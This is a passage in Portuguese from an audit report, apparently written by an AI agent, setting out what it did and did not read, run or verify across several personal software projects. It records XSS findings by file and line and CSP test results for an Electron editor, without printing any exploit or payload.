  não existe no arquivo (verificado por AST e por `co_names`), e o caminho do
  `structure_path` é alcançável pelo front (`app.js:9` + `index.html:19`).
- **Finanças**: só o `Financas.html` (876 linhas) e o `Financas.pyw`; os dados reais em
  `%APPDATA%\Financas` **não** foram abertos. As provas numéricas de F1 e F2 foram
  feitas com o `QUITA_SEED` (linha 1) extraído do arquivo, não com o plano real.
- **RadarPassagens**: o `radar.db` do Yuri **não** foi tocado (verificado: LastWriteTime
  inalterado). As provas de servidor foram feitas com config e banco temporários em
  `%TEMP%`, limpos no fim. O `.github/workflows/radar.yml` e o app Android foram lidos,
  não executados.
- **DA**: **re-auditado** nesta rodada (2ª tentativa — o agente da rodada principal não
  devolveu resultado). Não abri os dados do Yuri (pastas `dados l-arginine cl25%`,
  `teste 2`, `teste de deconvolução como no fityk`) — só nomes de arquivo. Os 4 achados do DA
  (PRIORIDADES 18-21) foram verificados por mim **lendo o código-fonte** (confirmei
  `raman_ai.py:537`, `input_data.py:92-123` e `:191-205`, `termico/analise.py:97-98`,
  `qt_app.py:805-832`, `gui.py:3494-3540`) e depois **passaram pelos 3 verificadores
  adversários** (3 lentes × 2 achados por rodada): **todos os 4 sobreviveram com severidade
  corrigida para BAIXO**. Um achado novo apareceu no meio (PRIORIDADE 24) e **ainda não foi
  verificado adversarialmente**. Nenhum teste do DA foi executado.
- **Write** (Electron): **re-auditado** nesta rodada. Não instalei nem rodei o app. Auditei
  eu mesmo o main process (`Write.js:35-79`, `preload.js`) e **não achei** XSS confirmado:
  `contextIsolation: true` + `sandbox: true` + `setWindowOpenHandler` negando +
  `will-navigate` bloqueado + `protocol.handle` com path guard + preload mínimo. A
  sanitização do renderer (`cleanInline` em `index.html:2978-3008`) escapa texto e remove
  SCRIPT/STYLE/IFRAME/OBJECT; o `src` do `<img>` vem de `getAttribute()` (não consegue
  quebrar o atributo). A última lacuna que eu tinha deixado em aberto — se o `l.html`
  extraído do PDF (`pdfLines`, `index.html:3132-3151`) chega escapado ao `normalizeImported`
  — **está fechada**: a linha 3145 aplica `esc(s)` em cada item antes de montar `l.html`.
  Não há CSP no `index.html` (risco residual, não explorado).
- **Write** (Electron), **rodada 4 (20/10)**: re-auditado por um agente isolado que
  devolveu **6 achados** (PRIORIDADES 31-36) — **2 XSS críticos** que a minha própria
  auditoria anterior **não tinha visto** (o `outerHTML` cru em `docio.js:742`/`:706` e o
  grupo LaTeX cru em `docio.js:973`), mais a ausência de CSP, a perda de rascunho ao
  fechar aba, o cache de CDN sem hash e a falta de teste de segurança. **Não instalei
  nem rodei o app** — tudo por leitura. **O que eu mesmo confirmei por leitura:** a
  ausência de CSP (grep em todo o projeto: só aparece em `testes/node_modules`),
  `IDB.del("tab:" + id)` sem confirmação (`app.js:84`), `protocol.handle("https")`
  gravando o corpo da rede sem hash (`Write.js:45-62`) e o `outerHTML` cru
  (`docio.js:742`, `:706`). **O que NÃO li:** `navegador/Write.html` (fora o `<head>`),
  `historico/`, `computador/instalador-windows/`, `src/slides.js`, `slideio.js`,
  `pdfedit.js`, `claude.js`, `ribbon.js`, `word.js`, `cloud.js`, `body.html`/`style.css`,
  `computador/app/index.html` (fora o grep), `codigo-fonte/dist/` e 28 dos 30
  `testes/t_*.js`. O `marked` de produção (12.0.2, do CDN) **não** foi lido — só a cópia
  de teste (`testes/lib/marked.js` 18.0.10).
- **TriboDEM**: **re-auditado** nesta rodada por um agente isolado (20/10) — **6 achados
  novos** (PRIORIDADES 25-30), **nenhum verificado adversarialmente ainda**. O agente
  **não leu** `dem_gpu.py`, `runner.py` e `yade_worker.py` (proibido: podem ter cálculo
  rodando) — o achado TD-01 (PRIORIDADE 25) **cita `dem_gpu.py:328`** a partir de
  grep, não de leitura do arquivo; **confirme a linha antes de aplicar**. Também não
  leu: `i18n.py` (só grep), `cad_brep.py`, `analyst.py`, `pecas_padrao.py`,
  `render_vtk.py`, `desenho2d.py`, `escavacao.py`, `estivagem.py`, `ponte_tk.py`,
  `TriboDEM.pyw`, `TriboDEM_classico.pyw`, `ensaio_completo.py`, `physics.py` (só
  linhas 180-309), a árvore `testes/` (só grep), `instalacao/` e o resto de `docs/`.
  **Não rodei nem alterei nada com cálculo em andamento.**
- **OmniRoute**: só leitura do `.env` (nomes das chaves) e do `storage.sqlite` (nomes das
  chaves). Nenhum valor de segredo foi lido, mostrado ou copiado.
- **Write — CSP (P33), 21/10:** o teste empírico (Playwright + Chromium) rodou em
  **páginas de teste fora da pasta Write**, em `%TEMP%\csp_probe`, `%TEMP%\p33_mathjax`
  e `%TEMP%\p33_csp3` (cópia de `codigo-fonte/`, `navegador/` e `testes/`) —
  **nada foi escrito no projeto Write**. **Fechado por medição nas rodadas 8 e 9:**
  (b) o MathJax 3.2.2 **não** exige `'unsafe-eval'` (medido: `tex2svg` → SVG, zero
  violação, com e sem); (c) a suíte de `testes/` **passa** com a CSP ativa (medido:
  30 testes, `rc=0` nos dois cenários; as 6 falhas da 1ª passada eram o
  `addScriptTag` inline do **próprio teste**, não o app — 8/8 passam depois da troca
  por `<script src>`); (d) o `pdf.js` 3.11.174 usa **fake worker**
  (`pdfjsWorker.WorkerMessageHandler`, main thread) — o app real cria **0 workers** e
  o `pdfjs` carrega igual com `worker-src 'none'` ⇒ `worker-src` é desnecessário.
  **O que continua aberto:** (a) se o host `claude.ai` implementa `window.claude.use`
  via `fetch` para outra origem (esse código não está no repositório) — se for,
  `connect-src 'self'` quebraria downloads/`db` na versão web; (e) o comportamento do
  `pdf.js` se o `pdf.worker.min.js` não estiver no cache — o cache real
  (`%APPDATA%\Write\bibliotecas`) hoje tem **só** MathJax e fontes, nenhum `pdf.js`
  (o harness de teste substitui por `window.pdfjsWorker = {}`, então **a suíte não
  cobre esse caminho**); e (f) a CSP **header** contra o **Electron real** — o
  `computador/node_modules` está **vazio** (Electron 33.2.1 não instalado) e só existe
  o binário em `%LOCALAPPDATA%\Programs\Write\Write.exe`, que **não** dá para
  instrumentar com Playwright ⇒ validei em Chromium, não em Electron.
